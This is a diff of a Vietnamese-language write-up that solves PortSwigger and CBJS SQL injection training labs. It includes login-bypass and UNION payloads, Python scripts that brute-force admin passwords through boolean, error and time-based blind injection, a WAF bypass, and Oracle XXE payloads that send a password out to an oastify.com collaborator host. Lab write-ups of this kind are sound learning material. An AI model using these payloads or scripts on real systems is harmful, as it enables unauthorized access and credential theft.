@@ -65,7 +65,7 @@ Bởi vì `1=1` luôn đúng nên câu truy vấn sẽ trả về tất cả cá
 
 ### Lab 2: [SQL injection vulnerability allowing login bypass](https://portswigger.net/web-security/sql-injection/lab-login-bypass)
 
->  This lab contains a SQL injection vulnerability in the login function.
+> This lab contains a SQL injection vulnerability in the login function.
 >
 > To solve the lab, perform a SQL injection attack that logs in to the application as the `administrator` user.
 
@@ -81,7 +81,7 @@ Bài lab yêu cầu chúng ta đăng nhập với user là `administrator` nhưn
 
 > This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.
 >
-> To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values. 
+> To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values.
 
 Truy cập lab, em vào xem sản phẩm theo danh mục Pets:
 
@@ -99,7 +99,7 @@ Vậy là câu truy vấn trả về nhiều hơn 1 cột. Em thêm lần lượ
 
 > This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.
 >
-> The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data. 
+> The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.
 
 Truy cập lab, em làm tương tự như lab 3 để tìm được số cột:
 
@@ -121,13 +121,11 @@ Vậy là cột 1 không được rồi. Em thay tiếp string `'hJ2Xhz'` vào `
 >
 > To solve the lab, display the database version string.
 >
-> <details>
-> <summary>Hint</summary>
+> **Hint**
 >
 > On Oracle databases, every `SELECT` statement must specify a table to select `FROM`. If your `UNION SELECT` attack does not query from a table, you will still need to include the `FROM` keyword followed by a valid table name.
 >
 > There is a built-in table on Oracle called `dual` which you can use for this purpose. For example: `UNION SELECT 'abc' FROM dual`
-> </details>
 
 Truy cập lab, em vào xem danh mục Pets:
 
@@ -205,15 +203,13 @@ Và cuối cùng đăng nhập thành công với `administrator`:`fvsh52kiu4l0i
 >
 > The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
 >
-> To solve the lab, log in as the `administrator` user. 
+> To solve the lab, log in as the `administrator` user.
 >
-> <details>
-> <summary>Hint</summary>
+> **Hint**
 >
 > On Oracle databases, every `SELECT` statement must specify a table to select `FROM`. If your `UNION SELECT` attack does not query from a table, you will still need to include the `FROM` keyword followed by a valid table name.
 >
-> There is a built-in table on Oracle called `dual` which you can use for this purpose. For example: `UNION SELECT 'abc' FROM dual` 
-> </details>
+> There is a built-in table on Oracle called `dual` which you can use for this purpose. For example: `UNION SELECT 'abc' FROM dual`
 
 Tương tự như lab trước nhưng do ứng dụng sử dụng Oracle database nên payload có chút khác biệt. Em biết được số cột mà câu truy vấn trả về là 2 nên em sử dụng payload `' UNION SELECT table_name, NULL FROM all_tables--` để liệt kê các bảng của database:
 
@@ -275,6 +271,282 @@ Giờ em sẽ đọc nội dung của cột `username` và `password` trong bả
 
 Và cuối cùng đăng nhập thành công với `administrator`:`mq2r88abp2y5z7y6xty0`.
 
+### Lab 11: [Blind SQL injection with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)
+
+> This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
+>
+> The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows.
+>
+> The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
+>
+> To solve the lab, log in as the administrator user.
+>
+> **Hint**
+>
+> You can assume that the password only contains lowercase, alphanumeric characters.
+
+Theo như mô tả của bài lab, ứng dụng thực hiện câu truy vấn có chứa giá trị cookie. Nhưng kết quả của câu truy vấn đó lại không được trả về và chúng ta cũng không thấy được bất kì thông báo lỗi nào.
+
+Tuy nhiên, ứng dụng lại hiển thị một dòng chữ `Welcome back!` khi câu truy vấn trả về hàng nào đó.
+
+![lab-11](images/lab-11/lab-11.png)
+
+Em đổi giá trị của cookie `TrackingId` thành `' OR 1=1--` thì dòng chữ đó vẫn xuất hiện:
+
+![lab-11-1](images/lab-11/lab-11-1.png)
+
+Em tiếp tục thử với payload `' OR 1=2--` thì không còn dòng chữ đó nữa:
+
+![lab-11-2](images/lab-11/lab-11-2.png)
+
+Như vậy, chúng ta có thể dựa vào sự xuất hiện của dòng chữ `Welcome back!` để kiểm tra xem điều kiện chúng ta thêm vào câu truy vấn là đúng hay sai.
+
+Tiếp theo, để tìm được độ dài của password, em sử dụng Burp Intruder.
+
+Em đổi giá trị của cookie `TrackingId` thành `' OR (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)=§1§)='administrator`.
+
+![lab-11-3](images/lab-11/lab-11-3.png)
+
+Em xác định được độ dài của password là 20:
+
+![lab-11-4](images/lab-11/lab-11-4.png)
+
+Với độ dài đã biết của password, em viết script sau để tìm được chính xác password.
+
+```python
+import requests
+import string
+
+url = "https://0add0018045a73ad8068941d00c80074.web-security-academy.net/"
+charset = string.ascii_lowercase + string.digits
+password = ""
+
+for i in range(1, 21):
+    for j in charset:
+        cookie = {"TrackingId":f"' OR SUBSTRING((SELECT password FROM users WHERE username='administrator'), {i}, 1)='{j}"}
+        
+        r = requests.get(url, cookies=cookie)
+        if "Welcome back!" in r.text:
+            password += j
+            break
+
+print(f"administrator:{password}")
+```
+
+Và cuối cùng đăng nhập thành công với `administrator`:`yeuo9hasc1hmsq2rxltz`.
+
+### Lab 12: [Blind SQL injection with conditional errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)
+
+> This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
+>
+> The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.
+>
+> The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.
+>
+> To solve the lab, log in as the `administrator` user.
+>
+> **Hint**
+>
+> This lab uses an Oracle database. For more information, see the SQL injection cheat sheet.
+
+Em thử thêm kí tự `'` vào giá trị của cookie `TrackingId` thì thấy xuất hiện lỗi:
+
+![lab-12](images/lab-12/lab-12.png)
+
+Thêm tiếp kí tự `'` vào em thấy không còn lỗi:
+
+![lab-12-1](images/lab-12/lab-12-1.png)
+
+Như vậy, chúng ta có thể tìm được password dựa vào thông báo lỗi này.
+
+Em đổi giá trị của cookie `TrackingId` thành `' || (SELECT CASE WHEN LENGTH(password)=§1§ THEN '' ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator') || '` để thực hiện brute-force độ dài của password sử dụng Burp Intruder:
+
+![lab-12-2](images/lab-12/lab-12-2.png)
+
+Em xác định được độ dài của password là 20:
+
+![lab-12-3](images/lab-12/lab-12-3.png)
+
+Tiếp theo, chúng ta cần lấy lần lượt từng kí tự trong password rồi so sánh với một kí tự để kiểm tra, nếu không có lỗi thì chúng ta sẽ lấy kí tự đó.
+
+Em viết script sau để tìm được password.
+
+```python
+import requests
+import string
+
+url = "https://0a4000a50496098781107f6d00a500f7.web-security-academy.net/"
+charset = string.ascii_lowercase + string.digits
+password = ""
+
+for i in range(1, 21):
+    for j in charset:
+        cookie = {"TrackingId": f"' || (SELECT CASE WHEN SUBSTR(password, {i}, 1)='{j}' THEN '' ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator') || '"}
+        r = requests.get(url, cookies=cookie)
+        
+        if r.status_code == 200:
+            password += j
+            break
+
+print(f"administrator:{password}")
+```
+
+Và cuối cùng đăng nhập thành công với `administrator`:`anvjib2zbhzn8fb0sbnc`.
+
+### Lab 13: [Visible error-based SQL injection](https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based)
+
+> This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.
+>
+> The database contains a different table called users, with columns called username and password. To solve the lab, find a way to leak the password for the administrator user, then log in to their account.
+
+Em thử thêm dấu `'` vào giá trị của cookie `TrackingId` thì thấy lỗi xuất hiện:
+
+![lab-13](images/lab-13/lab-13.png)
+
+Từ lỗi trên, chúng ta có thể thấy được toàn bộ câu truy vấn.
+
+Tiếp theo, em tận dụng hàm `CAST()` để tạo ra lỗi khi chuyển đổi loại dữ liệu từ `string` sang `int`. Em đổi giá trị của cookie `TrackingId` thành payload `' AND CAST((SELECT username FROM users LIMIT 1) AS int)=1--`. Gửi request đi, em nhận thấy user `administrator` nằm ở hàng đầu tiên trong bảng `users`:
+
+![lab-13-1](images/lab-13/lab-13-1.png)
+
+Như vậy, chỉ cần đổi `username` thành `password` trong payload là chúng ta sẽ lấy được password:
+
+![lab-13-2](images/lab-13/lab-13-2.png)
+
+Và cuối cùng đăng nhập thành công với `administrator`:`2qrqz8cwynn52caocn38`.
+
+### Lab 14: [Blind SQL injection with time delays](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays)
+
+> This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
+>
+> The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.
+>
+> To solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay.
+
+Bài lab yêu cầu chúng ta thực hiện khai thác SQL injection để khiến cho response bị trễ 10 giây.
+
+Em đổi giá trị của cookie `TrackingId` thành `' || pg_sleep(10)--` đã thành công:
+
+![lab-14](images/lab-14/lab-14.png)
+
+### Lab 15: [Blind SQL injection with time delays and information retrieval](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)
+
+> This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
+>
+> The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.
+>
+> The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.
+>
+> To solve the lab, log in as the `administrator` user.
+
+Trước tiên, em đổi giá trị của cookie `TrackingId` thành payload `' || (SELECT CASE WHEN (1=1) THEN pg_sleep(2) ELSE pg_sleep(0) END)--` và gửi request thì thấy response sau khoảng 2 giây:
+
+![lab-15](images/lab-15/lab-15.png)
+
+Đổi điều kiện `1=1` thành `1=2` trong payload thì em thấy response luôn:
+
+![lab-15-1](images/lab-15/lab-15-1.png)
+
+Tiếp theo, em sử dụng payload `' || (SELECT CASE WHEN (username='administrator' AND LENGTH(password)=§1§) THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users)--` để thực hiện brute-force độ dài của password sử dụng Burp Intruder:
+
+![lab-15-2](images/lab-15/lab-15-2.png)
+
+Em xác định được độ dài của password là 20:
+
+![lab-15-3](images/lab-15/lab-15-3.png)
+
+Từ độ dài của password đã biết, em viết script sau để tìm được chính xác password:
+
+```python
+import requests
+import string
+
+url = "https://0a7600f20468356580e6ccf4002e00d3.web-security-academy.net/"
+charset = string.ascii_lowercase + string.digits
+password = ""
+
+for i in range(1, 21):
+    for j in charset:
+        cookie = {"TrackingId": f"' || (SELECT CASE WHEN (username='administrator' AND SUBSTRING(password, {i}, 1)='{j}') THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users)--"}
+        r = requests.get(url, cookies=cookie)
+
+        if r.elapsed.total_seconds() > 2:
+            password += j
+            break
+
+print(f"administrator:{password}")
+```
+
+Và cuối cùng đăng nhập thành công với `administrator`:`3lf409hp0t5cfg0gj3d9`.
+
+### Lab 16: [Blind SQL injection with out-of-band interaction](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band)
+
+> This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
+>
+> The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.
+>
+> To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator.
+
+Bài lab yêu cầu chúng ta khiến database thực hiện DNS lookup tới Burp Collaborator.
+
+Em đổi giá trị của cookie `TrackingId` thành payload `' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://4v0ombmznbre7v78btp19c635ublzcn1.oastify.com/"> %remote;]>'),'/l') FROM dual--`, encode URL rồi gửi request:
+
+![lab-16](images/lab-16/lab-16.png)
+
+Sau đó, có thể quan sát thấy kết quả bên tab Collaborator:
+
+![lab-16-1](images/lab-16/lab-16-1.png)
+
+### Lab 17: [Blind SQL injection with out-of-band data exfiltration](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration)
+
+> This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
+>
+> The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.
+>
+> The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.
+>
+> To solve the lab, log in as the `administrator` user.
+
+Bài lab yêu cầu chúng ta đăng nhập vào ứng dụng với user là `administrator`.
+
+Trước tiên, chúng ta cần lấy được password, em đổi giá trị của cookie `TrackingId` thành payload `' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.mlb6ctchdthwxdxq1bfjzuwlvc16pwdl.oastify.com/"> %remote;]>'),'/l') FROM dual--`, encode URL rồi gửi request:
+
+![lab-17](images/lab-17/lab-17.png)
+
+Đợi chút sẽ thấy được password là subdomain trong tab Collaborator:
+
+![lab-17-1](images/lab-17/lab-17-1.png)
+
+Và cuối cùng đăng nhập thành công với `administrator`:`ljnfmtsp9sb2gaugtwce`.
+
+### Lab 18: [SQL injection with filter bypass via XML encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)
+
+> This lab contains a SQL injection vulnerability in its stock check feature. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.
+>
+> The database contains a `users` table, which contains the usernames and passwords of registered users. To solve the lab, perform a SQL injection attack to retrieve the admin user's credentials, then log in to their account.
+>
+> **Hint**
+>
+> A web application firewall (WAF) will block requests that contain obvious signs of a SQL injection attack. You'll need to find a way to obfuscate your malicious query to bypass this filter. We recommend using the Hackvertor extension to do this.
+
+Trước tiên, chúng ta cần bắt request khi check stock:
+
+![lab-18](images/lab-18/lab-18.png)
+
+Em thử thêm payload `UNION SELECT NULL--` vào `productID` thì thấy thông báo `"Attack detected"`:
+
+![lab-18-1](images/lab-18/lab-18-1.png)
+
+Để bypass được WAF, em sử dụng extension Hackverter để encode hex_entities:
+
+![lab-18-2](images/lab-18/lab-18-2.png)
+
+Vậy là ứng dụng đã nhận payload. Tiếp theo, em sử dụng payload `UNION SELECT password FROM users WHERE username='administrator'--` đã lấy được password của user `administrator`.
+
+![lab-18-3](images/lab-18/lab-18-3.png)
+
+Và cuối cùng đăng nhập thành công với `administrator`:`wpsmri0ycdrn69mt8mj9`.
+
 ## Khai thác SQL injection trên web đã viết ở Task 1
 
 ### SQLi ở chức năng xoá
@@ -300,3 +572,133 @@ Tương tự, khi nhấn vào `Sửa`, em thay đổi giá trị của tham số
 Sau khi nhấn sửa thì các thông tin của những mentee còn lại giống với mentee có `id` là `72`:
 
 ![kcsc-web-4](images/kcsc-web/kcsc-web-4.png)
+
+## Khai thác SQL injection trên lab CBJS
+
+### Sandbox
+
+#### Interactive SQL Login (level 1)
+
+Em nhập username là `admin'#` đã đăng nhập thành công:
+
+![sandbox-login-1](images/lab-cbjs/sandbox/sandbox-login-1.png)
+
+#### Interactive SQL Login (level 2)
+
+Em nhập username là `") or username='admin'#` đã đăng nhập thành công:
+
+![sandbox-login-2](images/lab-cbjs/sandbox/sandbox-login-2.png)
+
+#### Tìm kiếm tin tức
+
+![sandbox-search](images/lab-cbjs/sandbox/sandbox-search.png)
+
+Mục tiêu của chúng ta là cần lấy được password của admin.
+
+Em nhập keyword là `a` thì thấy được câu truy vấn và kết quả truy vấn như sau:
+
+![sandbox-search-1](images/lab-cbjs/sandbox/sandbox-search-1.png)
+
+Từ kết quả truy vấn trên, em xác định bảng `news` có 2 cột.
+
+Em đoán cột `password` và cột `username` sẽ nằm trong bảng `users` nên em nhập keyword là `a' union select password, null from users where username='admin'#` đã thành công lấy được password:
+
+![sandbox-search-2](images/lab-cbjs/sandbox/sandbox-search-2.png)
+
+### Basic
+
+#### Level 1
+
+Trước tiên, em đăng nhập thử với `admin`:`admin` thì thấy thông báo `Wrong username or password`:
+
+![basic-level-1](images/lab-cbjs/basic/basic-level-1.png)
+
+Em đổi giá trị của `username` thành `admin'#` đã thành công:
+
+![basic-level-1-1](images/lab-cbjs/basic/basic-level-1-1.png)
+
+Em cũng thử đổi giá trị của `password` thành `687AAB2D5FF60B93` cũng thành công:
+
+![basic-level-1-2](images/lab-cbjs/basic/basic-level-1-2.png)
+
+#### Level 2
+
+Trước tiên, em đăng nhập thử với `admin`:`admin` thì thấy thông báo `Wrong username or password`:
+
+![basic-level-2](images/lab-cbjs/basic/basic-level-2.png)
+
+Em đổi giá trị của `username` thành `admin"#` đã thành công:
+
+![basic-level-2-1](images/lab-cbjs/basic/basic-level-2-1.png)
+
+Cũng như level 1 em đổi giá trị của `password` thành `687AAB2D5FF60B93` cũng thành công:
+
+![basic-level-2-2](images/lab-cbjs/basic/basic-level-2-2.png)
+
+#### Level 3
+
+Trước tiên, em đăng nhập thử với `admin`:`admin` thì thấy thông báo `Wrong username or password`:
+
+![basic-level-3](images/lab-cbjs/basic/basic-level-3.png)
+
+Em thử thay giá trị của `username` thành `"` thì thấy lỗi xuất hiện:
+
+![basic-level-3-1](images/lab-cbjs/basic/basic-level-3-1.png)
+
+Vậy là giá trị của `username` được đưa vào hàm nào đó để xử lý.
+
+Để bypass được, em đổi giá trị của `username` thành `admin")#`:
+
+![basic-level-3-2](images/lab-cbjs/basic/basic-level-3-2.png)
+
+#### Level 6
+
+![basic-level-6](images/lab-cbjs/basic/basic-level-6.png)
+
+Mục tiêu của bài này là chúng ta cần đọc được database version.
+
+Em thử đổi giá trị của tham số `id` thành `2` thì thấy giá trị của attribute `src` thay đổi:
+
+![basic-level-6-1](images/lab-cbjs/basic/basic-level-6-1.png)
+
+Vậy là ứng dụng sẽ lấy một URL theo id tương ứng trong bảng.
+
+Em thay giá trị của tham số `id` thành `4` thì thấy thông báo `ID not found`:
+
+![basic-level-6-2](images/lab-cbjs/basic/basic-level-6-2.png)
+
+Như vậy, có thể hiểu rằng với `id` là `4` thì kết quả được trả về từ câu truy vấn gốc không chứa hàng nào cả. Em tận dụng toán tử `UNION` để đưa kết quả của câu truy vấn chèn vào tới kết quả của câu truy vấn gốc.
+
+Em thêm tiếp payload `UNION SELECT @@version`, encode URL rồi gửi request thì đã thấy được database version:
+
+![basic-level-6-3](images/lab-cbjs/basic/basic-level-6-3.png)
+
+### Advanced
+
+#### Level 7
+
+![advanced-level-7](images/lab-cbjs/advanced/advanced-level-7.png)
+
+Em thử đăng ký tài khoản với username là `a`, password là `a`, email là `a@a.com` sau đó đăng nhập thì thấy được giao diện sau:
+
+![advanced-level-7-1](images/lab-cbjs/advanced/advanced-level-7-1.png)
+
+Sau khi nhấn `Click here to show your Email` thì em thấy email mình vừa đăng ký hiện ra:
+
+![advanced-level-7-2](images/lab-cbjs/advanced/advanced-level-7-2.png)
+
+Có thể ứng dụng thực hiện câu truy vấn trả về email dựa trên username hoặc password đã đăng ký.
+
+Thử tiếp đăng ký với username là `'`, password là `a`, email là `a@a.com` sau đó đăng nhập và nhấn `Click here to show your Email` thì em thấy lỗi xuất hiện:
+
+![advanced-level-7-3](images/lab-cbjs/advanced/advanced-level-7-3.png)
+
+Vậy là chúng ta có thể chèn câu truy vấn vào username khi đăng ký.
+
+Em thực hiện đăng ký với username là `' union select password from users where username='admin'#`, password là `a`, email là `a@a.com` sau đó đăng nhập và nhấn `Click here to show your Email` thì đã thấy được password của user `admin`:
+
+![advanced-level-7-4](images/lab-cbjs/advanced/advanced-level-7-4.png)
+
+Và để lấy được hết thông tin từ bảng `users` như yêu cầu của bài. Em đăng ký với username là `' union select group_concat(id, '|', username, '|', password, '|', email) from users#`, password là `a`, email là `a@a.com` sau đó đăng nhập rồi nhấn `Click here to show your Email`:
+
+![advanced-level-7-5](images/lab-cbjs/advanced/advanced-level-7-5.png)
